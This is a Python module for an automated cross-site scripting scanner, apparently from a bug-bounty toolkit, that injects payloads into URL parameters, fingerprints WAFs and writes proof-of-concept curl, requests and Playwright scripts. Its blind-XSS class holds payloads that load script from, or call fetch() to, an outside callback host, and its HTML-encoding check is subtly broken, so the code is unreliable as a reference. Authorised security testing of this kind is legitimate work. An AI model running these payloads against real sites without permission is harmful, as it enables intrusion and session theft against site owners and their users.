"""
Specialized XSS Hunter
Advanced XSS detection: reflected, stored, DOM, blind, mutation-based
"""

import asyncio
import re
import urllib.parse
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from pathlib import Path

from core.config_manager import get_config
from hunting.scanner_orchestrator import VulnerabilityFinding, ScanTarget, ScannerType
from hunting.payload_manager import PayloadManager, PayloadContext


@dataclass
class XSSContext:
    url: str
    parameter: str
    reflection_context: str  # html_body, html_attr, js_context, js_event, etc.
    payload_used: str
    reflection: str
    filtered_chars: List[str] = None
    waf_detected: str = "none"


class XSSHunter:
    """Specialized XSS hunting module"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.payload_manager = PayloadManager(config_manager)
        self.findings: List[VulnerabilityFinding] = []

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for XSS vulnerabilities"""
        self.payload_manager.load_all()

        # Group targets by reflection context
        param_targets = [t for t in targets if t.parameters]

        for target in param_targets[:50]:  # Limit
            for param_name, param_value in target.parameters.items():
                await self._test_parameter(target, param_name, param_value)

        return self.findings

    async def _test_parameter(self, target: ScanTarget, param_name: str, param_value: str):
        """Test a single parameter for XSS"""
        # First, detect reflection context
        context = await self._detect_reflection_context(target, param_name, param_value)

        if not context:
            return

        # Get appropriate payloads for context
        payloads = self.payload_manager.get_payloads(
            "xss",
            context=context.reflection_context,
            limit=20
        )

        # Test each payload
        for payload_obj in payloads:
            payload = payload_obj.payload
            result = await self._test_payload(target, param_name, payload, context)

            if result:
                self.findings.append(result)

    async def _detect_reflection_context(self, target: ScanTarget, param_name: str, param_value: str) -> Optional[XSSContext]:
        """Detect how the parameter value is reflected in the response"""
        # Send a unique test string
        test_string = f"xss_test_{abs(hash(f'{target.url}{param_name}'))}"
        test_url = self._inject_parameter(target.url, param_name, test_string)

        try:
            import httpx
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                response = await client.get(test_url)

            # Analyze reflection
            reflection = self._find_reflection(response.text, test_string)
            if not reflection:
                return None

            # Determine context
            context_type = self._analyze_context(response.text, test_string, reflection)

            # Check for filtered characters
            filtered = self._check_filtered_chars(response.text, test_string)

            # Detect WAF
            waf = self._detect_waf(response)

            return XSSContext(
                url=target.url,
                parameter=param_name,
                reflection_context=context_type,
                payload_used=test_string,
                reflection=reflection,
                filtered_chars=filtered,
                waf_detected=waf,
            )
        except Exception:
            return None

    def _inject_parameter(self, url: str, param_name: str, value: str) -> str:
        """Inject a parameter value into URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _find_reflection(self, response_text: str, test_string: str) -> Optional[str]:
        """Find where the test string is reflected"""
        if test_string in response_text:
            # Find surrounding context (100 chars before and after)
            idx = response_text.find(test_string)
            start = max(0, idx - 100)
            end = min(len(response_text), idx + len(test_string) + 100)
            return response_text[start:end]
        return None

    def _analyze_context(self, response_text: str, test_string: str, reflection: str) -> str:
        """Analyze the HTML/JS context of reflection"""
        reflection_lower = reflection.lower()

        # Check for JavaScript context
        if any(ctx in reflection_lower for ctx in ['<script', 'javascript:', 'onclick=', 'onload=', 'onerror=', 'onmouseover=', 'addEventListener', 'eval(', 'setTimeout', 'setInterval']):
            if 'on' in reflection_lower and '=' in reflection_lower:
                return "js_event"
            return "js_context"

        # Check for HTML attribute context
        if re.search(r'<[^>]*\b\w+\s*=\s*["\'][^"\']*' + re.escape(test_string), reflection, re.IGNORECASE):
            return "html_attr"

        # Check for HTML body context
        if re.search(r'>[^<]*' + re.escape(test_string), reflection):
            return "html_body"

        # Check for URL parameter context
        if 'href=' in reflection_lower or 'src=' in reflection_lower or 'action=' in reflection_lower:
            return "url_param"

        # Default to HTML body
        return "html_body"

    def _check_filtered_chars(self, response_text: str, test_string: str) -> List[str]:
        """Check which characters are filtered/encoded"""
        filtered = []
        test_chars = ['<', '>', '"', "'", '&', '/', '\\', '(', ')', ';', ':', '@']

        for char in test_chars:
            if char in test_string:
                # Check if char appears encoded in reflection
                encoded_forms = [
                    urllib.parse.quote(char),
                    f"&#x{ord(char):x};",
                    f"&#{ord(char)};",
                    f"\\u{ord(char):04x}",
                    f"\\x{ord(char):02x}",
                ]
                found = False
                for enc in encoded_forms:
                    if enc in response_text:
                        found = True
                        break
                if not found and char not in response_text:
                    filtered.append(char)

        return filtered

    def _detect_waf(self, response) -> str:
        """Detect WAF from response headers"""
        waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare"],
            "akamai": ["akamai"],
            "imperva": ["imperva", "incapsula"],
            "f5": ["f5", "bigip"],
            "modsecurity": ["mod_security", "modsecurity"],
            "aws_waf": ["awselb", "aws-waf"],
        }

        headers_str = str(response.headers).lower()
        for waf, sigs in waf_signatures.items():
            if any(sig in headers_str for sig in sigs):
                return waf

        # Check status codes
        if response.status_code in [403, 406, 501]:
            return "generic"

        return "none"

    async def _test_payload(self, target: ScanTarget, param_name: str, payload: str, context: XSSContext) -> Optional[VulnerabilityFinding]:
        """Test a specific payload"""
        test_url = self._inject_parameter(target.url, param_name, payload)

        try:
            import httpx
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                response = await client.get(test_url)

            # Check if payload executes/reflects
            if self._check_payload_execution(response.text, payload, context):
                # Determine severity
                severity = self._assess_severity(context, payload)

                return VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="xss",
                    severity=severity,
                    title=f"XSS in {param_name} parameter ({context.reflection_context})",
                    description=f"Cross-site scripting vulnerability in {param_name} parameter. Reflection context: {context.reflection_context}. Payload: {payload}",
                    target=target,
                    evidence={
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "reflection_context": context.reflection_context,
                        "filtered_chars": context.filtered_chars,
                        "waf": context.waf_detected,
                        "response_snippet": self._find_reflection(response.text, payload),
                    },
                    poc=self._generate_xss_poc(target.url, param_name, payload, context),
                    confidence=0.85 if context.waf_detected == "none" else 0.7,
                    tags=["xss", context.reflection_context],
                )
        except Exception:
            pass

        return None

    def _check_payload_execution(self, response_text: str, payload: str, context: XSSContext) -> bool:
        """Check if payload appears unencoded in response"""
        # Simple check - payload appears in response
        if payload in response_text:
            # Verify it's not HTML-encoded
            encoded_payload = payload.replace('<', '<').replace('>', '>').replace('"', '"').replace("'", ''')
            if encoded_payload != payload and encoded_payload in response_text:
                return False  # It's encoded
            return True
        return False

    def _assess_severity(self, context: XSSContext, payload: str) -> str:
        """Assess XSS severity"""
        # Stored XSS would be higher
        # For reflected, depends on context
        if context.reflection_context in ["js_context", "js_event"]:
            return "P2"  # JS context often more exploitable
        elif context.reflection_context == "html_attr":
            return "P3"
        elif context.reflection_context == "html_body":
            return "P3"
        return "P4"

    def _generate_xss_poc(self, url: str, param: str, payload: str, context: XSSContext) -> str:
        """Generate XSS POC"""
        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse(parsed._replace(query=''))

        poc = f"""# XSS Proof of Concept
## Vulnerability Details
- **URL**: {url}
- **Parameter**: {param}
- **Reflection Context**: {context.reflection_context}
- **Payload**: {payload}

## Reproduction Steps
1. Navigate to: {base_url}?{param}={urllib.parse.quote(payload)}
2. Observe JavaScript execution

## cURL Command
```bash
curl -X GET "{base_url}?{param}={urllib.parse.quote(payload)}"
```

## Python Script
```python
import requests

url = "{base_url}"
params = {{"{param}": "{payload}"}}
response = requests.get(url, params=params)
print(f"Status: {{response.status_code}}")
print(f"Payload reflected: {'{payload}' in response.text}")
```

## Browser Reproduction (Playwright)
```python
from playwright.async_api import async_playwright

async def test_xss():
    async with async_playwright() as p:
        browser = await p.firefox.launch(headless=False)
        page = await browser.new_page()
        await page.goto("{base_url}?{param}={urllib.parse.quote(payload)}")
        # Check for alert
        page.on("dialog", lambda dialog: print(f"XSS Executed: {{dialog.message}}"))
        await page.wait_for_timeout(3000)
        await browser.close()

import asyncio
asyncio.run(test_xss())
```"""
        return poc


class DOMXSSHunter:
    """Specialized DOM-based XSS hunter"""

    def __init__(self, config_manager):
        self.config = config_manager

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for DOM XSS using static analysis"""
        findings = []

        # This would use LinkFinder, JSFScan, or custom JS analysis
        # For now, return empty - would be implemented with browser automation
        return findings

    async def analyze_js_for_sinks(self, js_code: str, url: str) -> List[Dict]:
        """Analyze JavaScript for dangerous sinks"""
        sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
            'eval', 'setTimeout', 'setInterval', 'Function',
            'location.href', 'location.assign', 'location.replace',
            'open', 'showModalDialog',
            'insertAdjacentHTML', 'createElement', 'appendChild',
        ]

        results = []
        for sink in sinks:
            pattern = rf'{sink}\s*[=\(]'
            for match in re.finditer(pattern, js_code):
                # Get context
                start = max(0, match.start() - 100)
                end = min(len(js_code), match.end() + 100)
                context = js_code[start:end]

                results.append({
                    'sink': sink,
                    'url': url,
                    'context': context,
                    'line': js_code[:match.start()].count('\n') + 1,
                })

        return results


class BlindXSSHunter:
    """Blind XSS hunter using callback servers"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.callback_url = os.getenv("BLIND_XSS_CALLBACK", "")

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for blind XSS"""
        if not self.callback_url:
            return []

        findings = []

        # Payloads that trigger callbacks
        payloads = [
            f"<script src={self.callback_url}></script>",
            f"<img src=x onerror=fetch('{self.callback_url}')>",
            f"'fetch('{self.callback_url}')'",
        ]

        for target in targets:
            for param_name in target.parameters.keys():
                for payload in payloads:
                    # Inject and wait for callback
                    # This would need a callback server integration
                    pass

        return findings


import os